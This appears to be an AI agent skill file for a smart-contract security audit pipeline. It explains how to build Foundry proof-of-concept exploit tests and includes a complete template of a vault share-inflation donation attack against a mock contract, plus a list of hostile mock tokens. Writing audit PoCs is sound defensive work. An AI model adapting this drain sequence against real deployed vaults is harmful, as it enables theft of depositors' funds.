---
name: poc-builder
description: Exploit PoC construction sub-skill for the ultimate-web3-security pipeline. Generates executable, standalone Foundry tests (unit and mainnet-fork) with precise harm assertions. Loaded by Phase 6 (Exploit Validation).
---

# PoC Builder (Foundry & Mainnet-Fork)

Transforms an attack hypothesis into **executable, reproducible proof of loss**. A finding backed by a passing Foundry test is indisputable evidence.

## 1. Anti-Anchoring Reading Discipline

Before writing code:
1. Re-read target contract source directly from disk.
2. Re-read on-path dependencies and actual deployment constructors.
3. Do NOT look at initial unvalidated hypothesis notes — derive the exploit directly from the live code to prevent anchoring to false assumptions.

## 2. Test Architecture & Classification

- **Unit-Level PoC (`test/Exploit_Unit.t.sol`):** For self-contained logic bugs, invariant breaches, math rounding errors, and access control bypasses. Uses standard `forge-std/Test.sol` and targeted mocks.
- **Mainnet-Fork PoC (`test/Exploit_Fork.t.sol`):** For bugs dependent on live on-chain state (Uniswap/Balancer liquidity pools, Chainlink oracle feeds, complex token interactions, proxy state). Pinned to a specific historical block:
  ```solidity
  vm.createSelectFork(vm.envString("ETH_RPC_URL"), PINNED_BLOCK_NUMBER);
  ```

## 3. Standard Foundry PoC Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {TargetVault} from "src/TargetVault.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";

contract ExploitTest is Test {
    TargetVault public target;
    MockERC20 public asset;

    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    function setUp() public {
        asset = new MockERC20("Underlying", "UND", 18);
        target = new TargetVault(address(asset));

        // Seed victim with 1,000 tokens
        asset.mint(victim, 1000e18);
        vm.prank(victim);
        asset.approve(address(target), type(uint256).max);

        // Seed attacker with minimum capital (e.g. 1 wei or flash-loanable funds)
        asset.mint(attacker, 1000e18);
        vm.prank(attacker);
        asset.approve(address(target), type(uint256).max);
    }

    function test_exploit_drain() public {
        // [1. Baseline Pre-State]
        uint256 victimAssetsBefore = asset.balanceOf(victim);
        uint256 attackerAssetsBefore = asset.balanceOf(attacker);

        // [2. Attacker Setup / Inflation / State Priming]
        vm.startPrank(attacker);
        target.deposit(1, attacker); // 1 wei deposit -> 1 share
        asset.transfer(address(target), 100e18); // Direct donation
        vm.stopPrank();

        // [3. Victim Normal Operation]
        vm.prank(victim);
        target.deposit(100e18, victim); // Victim deposits 100 ETH -> receives 0 shares

        // [4. Attacker Extraction]
        vm.prank(attacker);
        target.redeem(1, attacker, attacker); // Attacker burns 1 share and takes all assets

        // [5. Assert Invariant Violation and Material Harm]
        uint256 victimAssetsAfter = asset.balanceOf(victim);
        uint256 attackerAssetsAfter = asset.balanceOf(attacker);

        console2.log("Victim Loss:   ", (victimAssetsBefore - victimAssetsAfter) / 1e18, "tokens");
        console2.log("Attacker Profit:", (attackerAssetsAfter - attackerAssetsBefore) / 1e18, "tokens");

        // Hard assertions proving the exploit
        assertLt(victimAssetsAfter, victimAssetsBefore, "Victim should have lost assets");
        assertGt(attackerAssetsAfter, attackerAssetsBefore, "Attacker should have extracted profit");
        assertEq(target.balanceOf(victim), 0, "Victim was minted 0 shares for 100 tokens");
    }
}
```

## 4. Hostile Token & Callback Mock Library

When testing integration bugs, use specialized hostile mock tokens:

- **MockFeeOnTransfer:** Deducts `feePercent` during `transferFrom`, simulating tokens like PAXG or deflationary tokens.
- **MockReentrantToken:** Fires an external callback to `msg.sender` inside `transfer()` or `transferFrom()`, simulating ERC-777 / ERC-1155 recipient hooks.
- **MockRebasingToken:** Supports manual `rebase(multiplier)` to simulate Lido stETH or Ampleforth supply changes.
- **MockBlocklistToken:** Allows `setBlocked(address, true)` to simulate USDC/USDT blacklisting causing transfer reverts.
- **MockZeroTransferRevert:** Reverts whenever `transfer(to, 0)` is called, simulating tokens like LEND or old BNB.

## 5. Output Deliverables

Save all PoCs under `{AUDIT_DIR}/poc/<finding-id>/`:
- `Exploit.t.sol` — Complete runnable Foundry test file.
- `README.md` containing:
  - Exact command to execute: `forge test --match-test test_exploit -vvvv` (plus `--fork-url $RPC --fork-block-number N` if fork).
  - Expected terminal output and passed assertions.
  - Assumptions (starting balance, flash loan provider, gas limits).

